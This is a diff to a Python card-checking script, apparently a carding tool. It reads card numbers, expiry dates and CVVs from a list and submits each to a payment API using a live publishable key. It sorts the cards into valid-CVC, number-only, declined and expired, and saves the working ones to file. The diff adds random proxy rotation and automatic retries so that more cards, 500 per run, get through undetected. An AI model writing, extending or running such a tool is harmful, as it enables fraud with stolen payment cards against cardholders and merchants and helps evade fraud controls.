@@ -4,6 +4,7 @@
 import os
 import json
 import requests
+import random
 
 #Made By Bheemesh
 
@@ -11,6 +12,7 @@ import requests
 succcess = open("cvc.txt", "a")
 checked = open("checkcards.txt", "a")
 othercards = open("othercards.txt", "a")
+proxycount = 00
 
 def getnumber():
     read = open("num.txt","r")
@@ -46,6 +48,45 @@ def randomizer(): #This is to randomize the request content
     jsonrandom = randomocontent.json()
     return jsonrandom
 
+def randomproxy():
+    proxiesread = open("proxies.txt", "r")
+    readLinesProxies = proxiesread.readlines()
+    randomnum = random.randint(0,proxycount-1)
+    #print("Proxycount:")
+    #print(randomnum)
+    proxy = readLinesProxies[randomnum]
+    proxywithprotocol = "https://"+str(proxy)
+    print(proxywithprotocol)
+    proxiesread.close()
+    return proxywithprotocol
+
+
+
+
+
+
+def lineCheck():
+    readproxy = open("proxies.txt","r")
+    count = 0
+    global proxycount
+    for line in readproxy:
+        count = count+1
+    proxycount = count
+    #print(proxycount +" Proxies loaded)
+    print("Proxies Loaded:"+str(proxycount))
+    print("Checker Started")
+    print("-----------------------------------------")
+    print("        Checker made by @hellosre      ")
+    print("-----------------------------------------")
+
+
+
+    readproxy.close()
+
+#randomproxy()
+
+
+
 
 def checker(cc,jsonrandom):
     splitter = cc.split('|')
@@ -53,7 +94,6 @@ def checker(cc,jsonrandom):
     month = splitter[1]
     year = splitter[2]
     cvv = splitter[3]
-
     muid = '14bec475-2279-4ba5-87ce-1b4c2bf2dd04'
     sid = '731a3414-ff88-440a-b64e-f77a878f71b2'
 
@@ -106,58 +146,69 @@ def checker(cc,jsonrandom):
     'sid':  sid,#'6a909e32-d576-4bac-bf88-5372ac3e3ead',
     'key': 'pk_live_eBee6q6n88Q6DCAatTPCOycn00XBRXLwKV'
     }
-    responser = requests.post(url,headers=headers,data=data)
-    jsonrespone = responser.json()
-    if(responser.status_code == 200):
-        #print("CC is Valid")
-        if(jsonrespone["card"]["cvc_check"] == "unavailable"):
-            print("Proxy Error - Chnage your IP and restart the checker")
-            decrement()
+    proxy = "https://182.253.233.77:8081"
+    proxyfromfunction = randomproxy()
+    proxycheck = {"https":proxyfromfunction}
+    try:
+        responser = requests.post(url,headers=headers,data=data,proxies= proxycheck)
+        jsonrespone = responser.json()
+        if (responser.status_code == 200):
+            # print("CC is Valid")
+            if (jsonrespone["card"]["cvc_check"] == "unavailable"):
+                #print("Proxy Error - Chnage your IP and restart the checker")
+                print("Proxy error - Rechecking card with a different Proxy")
+                decrement()
 
 
 
-        #CHECKING IF THE CARD HAS THE CORRECT CVC
-        elif(jsonrespone["card"]["cvc_check"] == "pass"):
-            checked.write(cc)
-            checked.write('\n')
-            print("CVC CHECK PASS")
-            succcess.write("CVV"+"-----"+str(cc))
-            succcess.write(responser.text)
+            # CHECKING IF THE CARD HAS THE CORRECT CVC
+            elif (jsonrespone["card"]["cvc_check"] == "pass"):
+                checked.write(cc)
+                checked.write('\n')
+                print("CVC CHECK PASS")
+                succcess.write("CVV" + "-----" + str(cc))
+                succcess.write(responser.text)
 
-            print(cc)
+                print(cc)
 
-        #This means the Proxy is Dead (Change the IP of your VPN)
-        elif(jsonrespone["card"]["cvc_check"] == "unchecked"):
-            print("Proxy Error - Change your IP and restart the checker")
-            decrement() # Since this card has not been Checked , the Checked list count will decrement
-            #By this way no card in the list will be left unchecked.
+            # This means the Proxy is Dead (Change the IP of your VPN)
+            elif (jsonrespone["card"]["cvc_check"] == "unchecked"):
+                print("Proxy Error - Rechecking card with a different Proxy")
+                #print("Proxy Error - Change your IP and restart the checker")
+                decrement()  # Since this card has not been Checked , the Checked list count will decrement
+                # By this way no card in the list will be left unchecked.
+
+            else:
+                print(jsonrespone)
+            # print(jsonrespone["card"]["cvc_check"])
+            # print(cc)
+            # print(jsonrespone)
 
 
-        #print(jsonrespone["card"]["cvc_check"])
-        #print(cc)
-        #print(jsonrespone)
+        elif (responser.status_code == 402):
+            if (jsonrespone["error"]["code"] == "incorrect_cvc"):
+                print("CCN Found - " + str(cc))
+                checked.write(cc)
+                checked.write('\n')
+                # succcess.write(cc)
+                succcess.write("CCN" + "-" + str(cc))
+                succcess.write(responser.text)
+                succcess.write("--------------------------------------------------------------------------")
+            elif (jsonrespone["error"]["code"] == "card_declined"):
+                print("Card Declined - " + str(cc))
+                checked.write(cc)
+                checked.write('\n')
+                othercards.write(cc)
+                othercards.write(responser.text)
+                othercards.write("------------------------------------------------------------------------")
+            elif (jsonrespone["error"]["code"] == "expired_card"):
+                checked.write(cc)
+                checked.write('\n')
+                print("Expired Card - " + str(cc))
+    except:
+        print("Error Occured - Rechecking Card with a different Proxy")
+        decrement()
 
-
-    elif (responser.status_code == 402):
-        if(jsonrespone["error"]["code"] == "incorrect_cvc"):
-            print("CCN Found - " + str(cc))
-            checked.write(cc)
-            checked.write('\n')
-            #succcess.write(cc)
-            succcess.write("CCN"+"-"+str(cc))
-            succcess.write(responser.text)
-            succcess.write("--------------------------------------------------------------------------")
-        elif(jsonrespone["error"]["code"] == "card_declined"):
-            print("Card Declined - "+str(cc))
-            checked.write(cc)
-            checked.write('\n')
-            othercards.write(cc)
-            othercards.write(responser.text)
-            othercards.write("------------------------------------------------------------------------")
-        elif(jsonrespone["error"]["code"] == "expired_card"):
-            checked.write(cc)
-            checked.write('\n')
-            print("Expired Card - "+str(cc))
 
 
     #print(jsonrespone)
@@ -167,19 +218,21 @@ def checker(cc,jsonrandom):
 
 
 def main():
-    cards  = 100 #Update this variable with the number of cards you want to Check
+    cards  = 500 #Update this variable with the number of cards you want to Check
     f = open('list.txt', 'r')
     lines = f.readlines()
-    num = getnumber()
+    #num = getnumber()
+    lineCheck()
     f.close()
 
     for x in range(0,cards): #Getting each Card from the list.txt
+        num = getnumber()
         cc = lines[num]
         cc = cc[0:28]
         checker(cc,randomizer())
         increment() #This is to Increment the CC count
         print('--------------------------------------------------------------------'+str(num)+'------------------------------------------')
-        num = num + 1
+        #increment()
 
 def addsuccess(text):
     success = open("cvc.txt","a")
